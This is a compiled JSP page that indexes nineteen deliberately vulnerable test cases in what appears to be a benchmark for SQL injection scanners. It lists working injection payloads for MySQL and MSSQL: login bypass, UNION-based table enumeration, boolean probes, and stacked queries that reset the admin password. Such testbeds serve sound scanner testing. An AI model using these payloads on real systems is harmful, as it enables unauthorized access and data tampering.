...
public final class index_jsp extends org.apache.jasper.runtime.HttpJspBase
  ...
  public void _jspService(HttpServletRequest request, HttpServletResponse response)
    ...
    try {
      ...
      out.write("<title>Evaluation of SQL Injection Detection Accuracy - HTTP GET Method</title>\n");
      out.write("</head>\n");
      out.write("<body>\n");
      out.write("\n");
      out.write("<center><font size=\"5\">Injection Test Cases - HTTP 500 Erroneous Responses:</font></center><br><br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp?username=textvalue&password=textvalue2\">Case01-InjectionInLogin-String-LoginBypass-WithErrors.jsp</a></B><br>\n");
      ...
      out.write("  Independent Exploit 1: ' or 7=7--%20 <br>\n");
      out.write("  Independent Exploit 2: ' or 7=7#%20 <br>\n");
      out.write("  Independent Exploit 3: ' or 7=7/*%20 <br>\n");
      out.write("  <br>\n");
      out.write("  \n");
      out.write("<B><a href=\"Case02-InjectionInSearch-String-UnionExploit-WithErrors.jsp?msg=textvalue\">Case02-InjectionInSearch-String-UnionExploit-WithErrors.jsp</a></B><br>\n");
      ...
      out.write("  MSSQL Exploit: ' UNION SELECT id, name, 'jfks' FROM sysobjects--%20 <br>\n");
      out.write("  MySQL Exploit: ' UNION SELECT 1, table_name, 'jfks' FROM information_schema.tables--%20 <br>\n");
      out.write("  MySQL Exploit (No Comments): ' UNION SELECT 1, table_name, 'jfks' FROM information_schema.tables WHERE table_name like'%25 <br>\n");
      out.write("  <br>\n");
      out.write("  \n");
      out.write("<B><a href=\"Case03-InjectionInCalc-String-BooleanExploit-WithErrors.jsp?username=textvalue\">Case03-InjectionInCalc-String-BooleanExploit-WithErrors.jsp</a></B><br>\n");
      ...
      out.write("  MSSQL Exploit: InvalidValue624' OR EXISTS (SELECT * FROM sysobjects WHERE name > 's')--%20 <br>\n");
      ...
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case04-InjectionInUpdate-String-CommandInjection-WithErrors.jsp?msg=textvalue\">Case04-InjectionInUpdate-String-CommandInjection-WithErrors.jsp</a></B><br>\n");
      ...
      out.write("  MSSQL Exploit: Message'; UPDATE users SET password='1234' WHERE username='admin';--%20 <br>\n");
      ...
      out.write("  MySQL Exploit: ', message=(SELECT TABLE_NAME FROM information_schema.`TABLES` WHERE TABLE_NAME like'FILES')--%20  <br>\n");
      ...
      out.write("  <br> \n");
      out.write("\n");
      out.write("<B><a href=\"Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithErrors.jsp?orderby=msgid\">Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithErrors.jsp</a></B><br>\n");
      ...
      out.write("  A single result in the subquery (or none) will not cause a runtime exception, more will<br>\n");
      out.write("  MSSQL Exploit: (SELECT 1 FROM sysobjects WHERE name like'sysusers')--%20 <br>\n");
      out.write("  MySQL Exploit (No Comments): (SELECT 1 FROM information_schema.`TABLES` WHERE TABLE_NAME like'FILES') <br>\n");
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case06-InjectionInView-Numeric-PermissionBypass-WithErrors.jsp?transactionId=132\">Case06-InjectionInView-Numeric-PermissionBypass-WithErrors.jsp</a></B><br>\n");
      ...
      out.write("  Exploit 1: 1 or 7=7--%20 <br>\n");
      out.write("  Exploit 2: 1 or 7=7#%20 <br>\n");
      out.write("  Exploit 3: 1 or 7=7/*%20 <br>\n");
      out.write("  Exploit 4 (No Comments): 1 or 7=7 or 7=7<br>\n");
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case07-InjectionInSearch-Numeric-UnionExploit-WithErrors.jsp?msgId=1\">Case07-InjectionInSearch-Numeric-UnionExploit-WithErrors.jsp</a></B><br>\n");
      ...
      out.write("  MSSQL Exploit: 1 UNION SELECT id, name, 'jfks' FROM sysobjects--%20 <br>\n");
      out.write("  MySQL Exploit: 1 UNION SELECT 1, table_name, 'jfks' FROM information_schema.tables--%20 <br>\n");
      out.write("  MySQL Exploit (No Comments): 1 UNION SELECT 1, table_name, 'jfks' FROM information_schema.tables WHERE 1=1 OR 1=1 <br>\n");
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case08-InjectionInCalc-Numeric-BooleanExploit-WithErrors.jsp?minBalanace=10000\">Case08-InjectionInCalc-Numeric-BooleanExploit-WithErrors.jsp</a></B><br>\n");
      ...
      out.write("  <U>Examples of Boolean Exploits:</U><br>\n");
      out.write("  MSSQL Exploit: 100000000 OR EXISTS (SELECT * FROM sysobjects WHERE name > 's')--%20 <br>\n");
      out.write("  MySQL Exploit (No Comments): 100000000 OR EXISTS (SELECT * FROM information_schema.tables WHERE table_name > 'u') <br>\n");
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case09-InjectionInUpdate-Numeric-CommandInjection-WithErrors.jsp?msgid=1\">Case09-InjectionInUpdate-Numeric-CommandInjection-WithErrors.jsp</a></B><br>\n");
      ...
      out.write("  <U>Examples of Sql Command Injection Exploits:</U><br>\n");
      out.write("  MSSQL Exploit: 0; UPDATE users SET password='1234' WHERE username='admin';--%20 <br>\n");
      out.write("  <U>Examples of Deliberate Runtime Error Binary Exploits:</U><br>\n");
      out.write("  A single result in the subquery (or none) will not cause a runtime exception, more will<br>\n");
      out.write("  MySQL Exploit: 0 OR 1=(SELECT TABLE_NAME FROM information_schema.`TABLES` WHERE TABLE_NAME like'FILES')--%20  <br>\n");
      ...
      out.write("  <br> \n");
      out.write("\n");
      out.write("<B><a href=\"Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithErrors.jsp?orderby=1\">Case10-InjectionInSearchOrderBy-Numeric-BinaryDeliberateRuntimeError-WithErrors.jsp</a></B><br>\n");
      ...
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case11-InjectionInView-Date-PermissionBypass-WithErrors.jsp?transactionDate=2010-01-01\">Case11-InjectionInView-Date-PermissionBypass-WithErrors.jsp</a></B><br>\n");
      ...
      out.write("  <U>Examples of Permission Bypass Exploits:</U><br>\n");
      out.write("  Exploit 1 (MySql): 2010-01-01' or 7=7--%20 <br>\n");
      out.write("  Exploit 2 (MySql): 2010-01-01' or 7=7#%20 <br>\n");
      out.write("  Exploit 3 (MySql): 2010-01-01' or 7=7/*%20 <br>\n");
      out.write("  Exploit 4 (MySql, No Comments): 2010-01-01' or 7=7 or '7'='7<br>\n");
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case12-InjectionInSearch-Date-UnionExploit-WithErrors.jsp?transactionDate=2010-01-01\">Case12-InjectionInSearch-Date-UnionExploit-WithErrors.jsp</a></B><br>\n");
      ...
      out.write("  MSSQL Exploit: 2010-01-01' UNION SELECT 1,id, name, '2010-01-01' FROM sysobjects--%20 <br>\n");
      out.write("  MySQL Exploit: 2010-01-01' UNION SELECT 1, 1, table_name, '2010-01-01' FROM information_schema.tables--%20 <br>\n");
      ...
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case13-InjectionInCalc-Date-BooleanExploit-WithErrors.jsp?transactionDate=2010-01-01\">Case13-InjectionInCalc-Date-BooleanExploit-WithErrors.jsp</a></B><br>\n");
      ...
      out.write("  <U>Examples of Boolean Exploits:</U><br>\n");
      out.write("  MSSQL Exploit: 1900-01-01' OR EXISTS (SELECT * FROM sysobjects WHERE name > 's')--%20 <br>\n");
      out.write("  MySQL Exploit: 1900-01-01' OR EXISTS (SELECT * FROM information_schema.tables WHERE table_name > 'u')--%20 <br>\n");
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case14-InjectionInUpdate-Date-CommandInjection-WithErrors.jsp?transactionDate=2010-02-02\">Case14-InjectionInUpdate-Date-CommandInjection-WithErrors.jsp</a></B><br>\n");
      ...
      out.write("  <U>Examples of Sql Command Injection Exploits:</U><br>\n");
      out.write("  MSSQL Exploit: 1900-01-01'; UPDATE users SET password='1234' WHERE username='admin';--%20 <br>\n");
      out.write("  <U>Examples of Deliberate Runtime Error Binary Exploits:</U><br>\n");
      out.write("  A single result in the subquery (or none) will not cause a runtime exception, more will<br>\n");
      out.write("  MySQL Exploit: 1900-01-01' OR 1=(SELECT TABLE_NAME FROM information_schema.`TABLES` WHERE TABLE_NAME like'FILES')--%20  <br>\n");
      ...
      out.write("  <br> \n");
      out.write("\n");
      out.write("<B><a href=\"Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithErrors.jsp?transactionDate=2010-02-02\">Case15-InjectionInSearch-DateWithoutQuotes-UnionExploit-WithErrors.jsp</a></B><br>\n");
      ...
      out.write("  MySQL Exploit: CURDATE() UNION SELECT 1,1,TABLE_NAME,CURDATE() FROM information_schema.TABLES--%20  <br>\n");
      out.write("  MySQL Exploit (No Comments): CURDATE() UNION SELECT 1,1,TABLE_NAME,CURDATE() FROM information_schema.TABLES<br>\n");
      out.write("  MySQL Exploit (Date without quotes exploit): 2010-01-02 UNION SELECT 1,1,TABLE_NAME,CURDATE() FROM information_schema.TABLES--%20<br>\n");
      out.write("  <br> \n");
      out.write("\n");
      out.write("<B><a href=\"Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithErrors.jsp?transactionId=132\">Case16-InjectionInView-NumericWithoutQuotes-PermissionBypass-WithErrors.jsp</a></B><br>\n");
      ...
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithErrors.jsp?msgId=1\">Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-WithErrors.jsp</a></B><br>\n");
      ...
      out.write("  <U>Examples of Union Exploits:</U><br>\n");
      out.write("  Exploit: 1 or 7=7<br>\n");
      out.write("  MSSQL Exploit: 1 UNION SELECT id, name, null FROM sysobjects--%20 <br>\n");
      out.write("  MySQL Exploit: 1 UNION SELECT 1, table_name, null FROM information_schema.tables--%20 <br>\n");
      out.write("  MySQL Exploit (No Comments): 1 UNION SELECT 1, table_name, null FROM information_schema.tables WHERE 1=1 OR 1=1 <br>\n");
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithErrors.jsp?minBalanace=10000\">Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithErrors.jsp</a></B><br>\n");
      ...
      out.write("  <U>Examples of Boolean Exploits:</U><br>\n");
      out.write("  MSSQL Exploit: 100000000 OR EXISTS (SELECT * FROM sysobjects WHERE name > chr(117))--%20 <br>\n");
      out.write("  MySQL Exploit: 100000000 OR EXISTS (SELECT * FROM information_schema.tables WHERE table_name like concat(char(70),char(73),char(76),char(69),char(83)))--%20 <br>\n");
      ...
      out.write("  <br>\n");
      out.write("\n");
      out.write("<B><a href=\"Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithErrors.jsp?msgid=1\">Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithErrors.jsp</a></B><br>\n");
      out.write("  Injection into numeric values in the scope of a query within an update page with erroneous responses.<br>\n");
      out.write("  <U>Barriers:</U><br>\n");
      out.write("  Single Quote & Double Quote Input Validation <br>\n");
      out.write("  <U>SQL Statement Context:</U><br>\n");
      ...
      out.write("  [InvalidNumericValue] OR 1=(SELECT [FieldName] FROM [TableName] WHERE [FieldName] like'UniqueValue')[comment mark][space]<br>\n");
      out.write("  <U>Examples of Sql Command Injection Exploits:</U><br>\n");
      out.write("  MSSQL Exploit: 0; UPDATE users SET password= chr(49)%2bchr(50)%2bchr(51)%2bchr(52) WHERE username= chr(97)%2bchr(100)%2bchr(109)%2bchr(105)%2bchr(110);--%20 <br>\n");
      out.write("  <U>Examples of Deliberate Runtime Error Binary Exploits:</U><br>\n");
      out.write("  A single result in the subquery (or none) will not cause a runtime exception, more will<br>\n");
      out.write("  MySQL Exploit: 0 OR 1=(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_NAME like concat(char(70),char(73),char(76),char(69),char(83)))--%20  <br>\n");
